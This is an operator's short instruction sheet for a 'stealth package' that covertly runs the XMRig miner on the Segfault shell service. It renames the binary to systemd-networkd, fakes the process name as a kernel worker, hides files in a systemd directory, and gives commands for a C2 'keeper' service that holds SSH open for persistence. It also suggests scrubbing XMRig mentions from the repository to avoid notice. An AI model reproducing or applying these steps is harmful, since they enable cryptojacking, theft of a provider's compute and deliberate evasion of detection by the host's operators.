Stealth package for Segfault + C2 keepalive
Repo: https://github.com/andreamiri354-lab/veron1

WHAT CHANGED
- No HTTP API, no colors, no window title, no log file
- RandomX light mode (2 GB Segfault cap)
- Binary renamed on disk to systemd-networkd
- Process argv faked as [kworker/u8:0-events]
- Files live in /sec/.local/share/systemd  (persists across reconnects)
- Process still dies if SSH drops — C2 keeper holds the SSH

UPLOAD TO GITHUB (replace old loud files)
  config.json
  start.sh
  install.sh
  keeper.sh
  keeper.service
  xmrig          (keep the binary, install.sh renames it on target)
Do NOT upload a file named xmrig.service or README that says XMRig if you want the tree quieter.
You can delete: setup-hugepages.sh, xmrig.service, SHA256SUMS, README.md contents

ON C2 (persistence = open SSH)
  apt-get install -y sshpass
  mkdir -p /opt/veron-keeper
  # copy keeper.sh + keeper.service there
  cat >/etc/veron.env <<EOF
SF_HOST=lsd.segfault.net
SF_SECRET=PUT_SECRET_HERE
EOF
  chmod 600 /etc/veron.env
  cp keeper.service /etc/systemd/system/veron-keeper.service
  systemctl daemon-reload
  systemctl enable --now veron-keeper

LIMITS
- ps still shows high CPU; /proc/PID/exe can still be inspected
- SupportXMR public page still shows worker Veron
- THC can see container CPU from the host
- This is camouflage, not a rootkit
